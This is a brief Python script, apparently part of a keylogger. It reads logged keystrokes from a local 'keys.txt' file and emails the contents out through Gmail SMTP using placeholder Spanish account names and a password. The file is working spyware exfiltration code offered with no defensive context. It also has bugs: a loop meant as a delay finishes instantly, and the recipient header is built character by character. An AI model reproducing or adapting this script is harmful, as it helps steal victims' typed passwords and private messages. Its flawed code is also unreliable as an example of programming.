#!/usr/bin/env python

import os
import smtplib
from email import message
from email.mime.text import MIMEText
from os.path import join as pjoin

save_dir = "C:\\log\\"
filename = "keys.txt"
dir = pjoin(save_dir, filename)
origin = "correo_origen"
destination = "correo_destino"
password = "contra_primer_correo"
subject = "tema_correo"
server = "smtp.gmail.com"
port = 587
email_space = ", "

with open(dir, 'r') as file:
    data = file.read().replace('\n', '')

i = 0
while i < 14400:
	i += 1
	if i == 14400:
		msg = MIMEText(data)
		msg['Subject'] = subject
		msg['To'] = email_space.join(destination)
		msg['From'] = origin
		mail = smtplib.SMTP(server, port)
		mail.starttls()
		mail.login(origin, password)
		mail.sendmail(origin, destination, msg.as_string())
		mail.quit()
